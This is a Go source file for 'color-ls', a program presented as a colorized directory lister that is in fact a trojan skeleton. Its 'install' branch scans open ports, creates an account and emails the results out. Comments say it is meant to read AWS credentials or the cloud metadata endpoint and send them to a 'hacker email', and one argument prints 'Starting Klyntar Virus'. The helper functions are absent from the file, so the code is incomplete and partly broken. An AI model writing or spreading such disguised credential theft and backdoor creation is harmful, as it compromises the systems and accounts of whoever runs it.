package main

import (
	"fmt"
	"os"
	"path/filepath"
	"strings"

	. "github.com/logrusorgru/aurora"
)

func main() {

	//Scan .aws/credentials or 169.254.169.254/metadata using http request

	if len(os.Args) > 1 && os.Args[1] == "install" {
		fmt.Println(Bold(Green("Installing Colorized Directory lister :D ")))

		openPorts := getOpenPorts()
		stringPorts := strings.Join(openPorts, "-")
		crendetialsAccount := createUserAndGetAccountID()

		messagePorts := fmt.Sprintf("PORTS SCANNED: %s \n", stringPorts)
		messageCredentials := fmt.Sprintf("ACCOUNT CREATED: %s\n", crendetialsAccount)
		emailMessage := messagePorts + messageCredentials

		sendEmail(emailMessage)
	} else if os.Args[1] == "help" {
		help()
		return
	} else if os.Args[1] == "klyntar" {
		fmt.Println(Bold(Cyan("Starting Klyntar Virus...\n")))
	} else {
		showDirectorys(os.Args[1])
		return
	}

	//Scan all ports open in host

	//Verify connection with external networking
	//If not have external networking connection open it

	//Create string message with sensitive data and send to hacker email

	//Create new user in account with full access account
	//Send account crendentials in e-mail with account and host information
}

func help() {
	fmt.Println(Bold("Usage: color-ls [install] or <directory> \n\tSimple program list current files and folders colorized :D"))
}

func showDirectorys(directory string) {

	// root, errWd := os.Getwd()

	// if errWd != nil {
	// 	panic(errWd)
	// }

	err := filepath.Walk(directory, func(path string, info os.FileInfo, err error) error {
		splitedDir := strings.Split(path, "/")
		onlyDir := splitedDir[len(splitedDir)-1]

		fmt.Println(Bold(Magenta(onlyDir)))

		return nil
	})

	if err != nil {
		panic(err)
	}

}
